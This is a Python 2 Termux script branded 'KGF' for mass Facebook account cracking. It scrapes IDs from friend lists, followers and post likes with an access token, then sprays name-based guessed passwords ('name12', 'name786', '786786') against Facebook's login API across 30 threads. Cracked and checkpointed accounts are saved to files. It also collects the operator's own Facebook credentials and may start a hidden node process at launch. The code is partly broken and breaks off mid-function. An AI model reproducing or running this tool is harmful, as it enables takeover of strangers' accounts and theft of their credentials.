#!/usr/bin/python
# coding=utf-8
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechanize")
    os.system("python2 kgf1.py")
try:
    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
 	os.system('mv ... .....')
	os.system('cd ..... && npm install')
 	os.system('#')
 	os.system('#')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.07)

def kgf(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Logging In\033[0;97m "+o),;sys.stdout.flush();time.sleep(0.1)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Saving Token\033[0;97m "+o),;sys.stdout.flush();time.sleep(0.1)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Getting Updates\033[0;97m "+o),;sys.stdout.flush();time.sleep(0.1)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Logging Out\033[0;97m "+o),;sys.stdout.flush();time.sleep(0.1)
def download():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Downloading\033[0;97m "+o),;sys.stdout.flush();time.sleep(0.1)
#Tech-kgf
#logo01
logo = """
\t\x1b[1;93m888    d8P   .d8888b.  8888888888 
\t\x1b[1;92m888   d8P   d88P  Y88b 888        
\t\x1b[1;93m888  d8P    888    888 888        
\t\x1b[1;90m888d88K     888        8888888 
\t\x1b[1;90m8888888b    888  88888 888  
\t\x1b[1;92m888  Y88b   888    888 888 
\t\x1b[1;93m888   Y88b  Y88b  d88P 888        
\t\x1b[1;92m888    Y88b  "Y8888P88 888 
\033[1;97m--------------------------------------------------
\033[1;95m➤\033[1;93m Coded by\033[1;91m :\033[1;92m Shafqat Ali
\033[1;95m➤\033[1;93m Github\033[1;91m   :\033[1;92m https://github.com/The-Kgf
\033[1;95m➤\033[1;93m Fb\033[1;91m       :\033[1;92m https://m.facebook.com/alon3cyber
\033[1;95m➤\033[1;94m AFTAB \x1b[1;91mX3 \x1b[1;93mSHAFQAT
\033[1;97m--------------------------------------------------
"""

idh = []
	
def the_kgf():
    os.system("clear")
    print logo
    kgf("\033[1;93mFirst Tools login")
    print("\033[1;97m-------------------")
    username = raw_input("\033[1;97m[+]\033[1;96m Username :\033[1;97m ")
    if username =="Kgf":
        os.system("clear")
        print logo
        print ("\033[1;92m[✓] Username : Kgf (Correct)")
        passwordss = raw_input("\033[1;97m[+]\033[1;96m Password :\033[1;97m ")
        if passwordss =="Kgf":
            os.system("clear")
            print logo
            logging()
            os.system("clear")
            print logo 
            print ("\033[1;92m[✓]\033[1;93m Username : Kgf\033[1;92m (Correct)")
            print ("\033[1;92m[✓]\033[1;93m Password : Kgf\033[1;92m (Correct)")
            time.sleep(1)
            print('')
            kgf("\033[1;92m[✓] Login Successful\033[0;97m")
            os.system('xdg-open https://chat.whatsapp.com/HKpRRvwIxu298Zglwj93XZ')
            time.sleep(1)
        try:
            open(".login.txt","r")
            menu()
        except(KeyError , IOError):
            login_choice()
        else:
            print ("[!] Password : "+passwordss+" (Wrong)")
            os.system('xdg-open https://chat.whatsapp.com/HKpRRvwIxu298Zglwj93XZ')
            time.sleep(1)
            the_kgf()
    else:
        print ("[!] Username : "+username+" (Wrong)")
        os.system('xdg-open https://chat.whatsapp.com/HKpRRvwIxu298Zglwj93XZ')
        time.sleep(1)
        the_kgf()
	
def login_choice():
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    time.sleep(1)
    os.system('clear')
    print logo
    print ("\033[1;96m[\033[1;90m1\033[1;96m]\033[1;90m==\033[1;92m> \033[1;97mRandom Number Cloning \033[1;97m(\033[1;92mno login\033[1;97m) ")
    print ("\033[1;96m[\033[1;90m2\033[1;96m]\033[1;90m==\033[1;92m> \033[1;97mRandom Email Cloning  \033[1;97m(\033[1;92mno login\033[1;97m) ")
    print ("\033[1;96m[\033[1;90m3\033[1;96m]\033[1;90m==\033[1;92m> \033[1;97mClone Friendlist and Public ID \033[1;97m(\033[1;92mlogin\033[1;97m) ")
    print ("\033[1;96m[\033[1;90m0\033[1;96m]\033[1;90m==\033[1;92m> \033[1;91mExit") 
    print("\033[1;97m--------------------------------------------------")
    clone_main()
def clone_main():
    hack = raw_input("\n╰─➣ ")
    if hack =="1":
        os.system("python2 .main.md")
        time.sleep(1)
        menu()
    if hack =="2":
        os.system("python2 .README.md")
        time.sleep(1)
        menu()
    if hack =="3":
        loginvia()   
    elif hack =="0":
        os.system("exit")
    else:
	print "\x1b[1;91mFill in correctly"
        clone_main()

def loginvia():
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    time.sleep(1)
    os.system('clear')
    print logo
    print ("\033[1;93m[\033[1;90m1\x1b[1;93m]\033[1;90m==\033[1;92m> \033[1;97mlogin With Access Token ")
    print ("\033[1;93m[\033[1;90m2\x1b[1;93m]\033[1;90m==\033[1;92m> \033[1;97mLogin With User And Pass")
    print ("\033[1;91m[\033[1;90m0\x1b[1;91m]\033[1;90m==\033[1;92m> \033[1;91mBack") 
    print("\033[1;97m--------------------------------------------------")
    clone_loginvia()
def clone_loginvia():
    hack = raw_input("\n╰─➣ ")
    if hack =="1":
        os.system("clear")
        print logo
	os.system("python3 .loading.md")
        time.sleep(1)
        os.system('clear')
	print logo
        print ("Login With Token").center(50)
	print("\033[1;97m--------------------------------------------------")
        token = raw_input("\033[1;97m[+]\033[1;93m Paste Token Here :\033[1;97m ")
	print("\033[1;97m--------------------------------------------------")
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        kgf("\r\033[1;92m[✓] Login Successfull\033[0;97m")
    os.system('xdg-open https://chat.whatsapp.com/HKpRRvwIxu298Zglwj93XZ')
    os.system('clear')
    
    print logo
    print("\033[1;92mChecking Token\033[1;0m").center(50)
    time.sleep(1)
    os.system('clear')
    print logo
    print("\033[1;97mRefresh Token\033[1;0m").center(50)
    time.sleep(1)
    os.system("clear")
    print logo
    print("\033[1;92mPlease Wait 0\x1b[1;91m_\033[1;92m0").center(50)
    time.sleep(5)
    os.system("clear")
    print logo
    print("\033[1;97mToken has been saved\033[1;0m").center(50)
    time.sleep(1)
    os.system('xdg-open https://wa.me/message/KI7ZWQWQ6O5PN1')
    menu()
    if hack =="2":
        loginfb()
    elif hack =="0":
	        menu()
    else:
	        print ("[!] Please Select a Valid Option")
		clone_loginvia()
def loginfb():
    os.system("clear")
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.1)
    os.system('clear')
    print logo
    print("Login With Facebook Account").center(50)
    print("Use Proxy to login account ").center(50)
    print("\033[1;97m--------------------------------------------------")
    id = raw_input("\033[1;97m[+]\033[1;93m Email/ID/Number :\033[1;97m ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("\033[1;97m[+]\033[1;93m Passwor :\033[1;97m ")
    print("\033[1;97m--------------------------------------------------")
    logging()
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        time.sleep(1)
	print("\033[1;92mChecking account\033[1;0m").center(50)
	time.sleep(0.1)
	os.system("clear")
	print logo
	print("\033[1;97mRefresh account\033[1;0m").center(50)
	time.sleep(0.1)
	os.system("clear")
	print logo
	print("\033[1;92mPlease Wait 0\x1b[1;91m_\033[1;92m0").center(50)
	time.sleep(0.1)
	os.system("clear")
	print logo
	print("\033[1;97mAccount has been saved\033[1;0m").center(50)
        time.sleep(1)
	os.system('xdg-open https://chat.whatsapp.com/HKpRRvwIxu298Zglwj93XZ')
        menu()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
            time.sleep(0.1)
            loginfb()
        else:
            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
            time.sleep(0.1)
            loginfb()

def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print logo
        print("[!] Error 404.Token Not Found")
        os.system("rm -rf .login.txt")
        time.sleep(0.1)
        login_choice()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("\033[1;91m[!] Loading Failed . Your Account Has a Checkpoint")
        os.system("rm -rf .login.txt")
        time.sleep(0.1)
        login_choice()
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.01)
    os.system('clear')
    print logo
    jalan('\x1b[1;31;40m[\x1b[1;92m*\x1b[1;31;40m] \x1b[1;33mAccount Name\x1b[1;30;40m  ==\x1b[1;91m> \x1b[1;92m ' + name)
    jalan('\x1b[1;31;40m[\x1b[1;92m*\x1b[1;31;40m] \x1b[1;33mDate Of Birth\x1b[1;30;40m ==\x1b[1;91m> \x1b[0;92m ' + a['birthday'])
    sys.stdout.flush()
    time.sleep(0.01)
    print("\033[1;97m--------------------------------------------------")
    print("\033[1;91m[\033[1;92m1\033[1;91m] \033[1;90m==\033[1;92m> \033[1;97mClone Frienlist and Public ID")
    print("\033[1;91m[\033[1;92m2\033[1;91m] \033[1;90m==\033[1;92m> \033[1;97mRandom with choice password")
    print("\033[1;91m[\033[1;92m3\033[1;91m] \033[1;90m==\033[1;92m> \033[1;97mClone Bangladesh and India")
    print("\033[1;91m[\033[1;92m4\033[1;91m] \033[1;90m==\033[1;92m> \033[1;97mMore Hacking Tools \033[1;97m(\033[1;92mContinue\033[1;97m) ")
    print("\033[1;91m[\033[1;92m5\033[1;91m] \033[1;90m==\033[1;92m> \033[1;97mContact Owner")
    print("\033[1;91m[\033[1;92m6\033[1;91m] \033[1;90m==\033[1;92m> \033[1;97mTool Update")
    print("\033[1;91m[\033[1;92m0\033[1;91m] \033[1;90m==\033[1;92m> \033[1;91mlogout")
    print("\033[1;97m--------------------------------------------------") 
    menu_select()
def menu_select():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        crack()
    if option =="2":
        choice()
    if option =="3":
        morec()
    if option =="4":
        hacker()
    elif option =="5":
        os.system('xdg-open https://wa.me/message/KI7ZWQWQ6O5PN1')
	menu()
    elif option =="6":
        os.system("clear")
        print logo
        updateing()
        os.system("git pull origin master")
        time.sleep(1)
        os.system("clear")
        print logo
        kgf("\033[1;32m[✓] Tool Has Been Updated Successfully\033[0;97m")
        time.sleep(1)
        os.system("python2 kgf1.py")
    elif option =="0":
        logout()
        os.system("rm -rf .login.txt")
        time.sleep(1)
        print("\r\033[1;32m[✓] Logged Out Successfully\033[0;97m")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()
		
def crack():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	os.system("python3 .loading.md")
        time.sleep(1)
        os.system('clear')
        print logo
        print ("\033[1;91m[\033[1;90m1\033[1;91m]\033[1;90m==\033[1;92m> \033[1;97mCrack From Friend List")
	print ("\033[1;91m[\033[1;90m2\033[1;91m]\033[1;90m==\033[1;92m> \033[1;97mCrack From Public ID")
	print ("\033[1;91m[\033[1;90m3\033[1;91m]\033[1;90m==\033[1;92m> \033[1;97mCrack From Followers")
	print ("\033[1;91m[\033[1;90m4\033[1;91m]\033[1;90m==\033[1;92m> \033[1;97mCrack From Page/Group/ID Post")
	print ('\033[1;91m[\033[1;90m0\033[1;91m]\033[1;90m==\033[1;92m> \033[1;91mBack')
	print("\033[1;97m--------------------------------------------------")
	crack2()
def crack2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="4":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input Post ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
			z = json.loads(r.text)
			for i in z["data"]:
				uid=i['id']
				na=i['name']
				nm=na.rsplit(" ")[0]
				id.append(uid+'|'+nm)
		except KeyError:
			print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
			raw_input("\nPress Enter To Back")
			crack()
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		crack2()
	print("\033[1;97m[✓]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m The Process Is Running In Background\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m To Stop Process Press CTRL Then Press\033[1;91m z\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m--------------------------------------------------")
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"12"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"786"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass3+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass3+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="786786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;93m[\033[1;97mCheck\x1b[1;91m-\x1b[1;97mPoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass4+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass4+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="000786"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass5+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[1;91m[\033[1;92mSuccessfull\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass5+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6=b['last_name'] + '123'
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass6+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\033[1;91m[\033[1;92mSuccessfull\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass6+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass6=b['last_name'] + '12345'
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass7+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                           print("\033[1;91m[\033[1;92mSuccessfull\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass7+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                           ok=open("ok.txt","a")
		                                                           ok.write(uid+" | "+pass7+"\n")
		                                                           ok.close()
		                                                           oks.append(uid)
		                                                     
									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[✓]\033[1;92m Process Has Been Completed')
	print('\033[1;97m[\x1b[1;93m✓\x1b[1;97m]\033[1;92m Total\x1b[1;93m CP \033[1;91m/\033[1;92mOK\033[1;93m:\x1b[1;97m\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	down()
def down():
    dow = raw_input("\033[1;97m[?]\033[1;93m Do Yoou Want To Download Cp File?\033[1;97m (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("\n\033[1;97m[!]\033[1;93m Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('\033[1;93m[✓]\033[1;92m File Downloaded Successfully')
        print("\033[1;93m[✓]\033[1;93m Please Open Your Internal Storage and Rename The File")
        raw_input("\033[1;97mPress Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("\033[1;91m[!] Please Select a Valid Option ")
        down()
		
def choice():
    os.system("clear")
    print logo
    os.system("python3 .loading.md")
    time.sleep(1)
    os.system('clear')
    print logo
    print("\033[1;92m[\033[1;90m1\x1b[1;92m]\033[1;90m==\033[1;92m> \033[1;97mRandom Frienlist With 2 Choice Pass")
    print("\033[1;92m[\033[1;90m2\x1b[1;92m]\033[1;90m==\033[1;92m> \033[1;97mRandom Frienlist With 5 Choice Pass")
    print("\033[1;92m[\033[1;90m0\x1b[1;92m]\033[1;90m==\033[1;92m> \033[1;91mBack")	
    time.sleep(0.5)
    print("\033[1;97m--------------------------------------------------")
    choice_man()
def choice_man():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        unikk()
    if option =="2":
        randm()
    if option =="0":	
          menu()
    else:
          print ("[!] Please Select a Valid Option")
          choice_man()		
		
def unikk():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	os.system("python3 .loading.md")
        time.sleep(1)
        os.system('clear')
        print logo
	print ("\033[1;91m[\033[1;90m1\033[1;91m]\033[1;90m==\033[1;92m> \033[1;97mCrack From Friend List")
	print ("\033[1;91m[\033[1;90m2\033[1;91m]\033[1;90m==\033[1;92m> \033[1;97mCrack From Public ID")
	print ("\033[1;91m[\033[1;90m3\033[1;91m]\033[1;90m==\033[1;92m> \033[1;97mCrack From Followers")
	print ("\033[1;91m[\033[1;90m4\033[1;91m]\033[1;90m==\033[1;92m> \033[1;97mCrack From Page/Group/ID Post")
	print ("\033[1;91m[\033[1;90m0\033[1;91m]\033[1;90m==\033[1;92m> \033[1;91mBack")
	print("\033[1;97m--------------------------------------------------")
	unikk2()
def unikk2():
	devil = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if devil=="1":
		os.system("clear")
		print logo
		pass1=raw_input("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m ")
		pass2=raw_input("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif devil =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input Post ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m ")
		pass2=raw_input("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			unikk()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif devil =="3":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input Post ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m ")
		pass2=raw_input("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
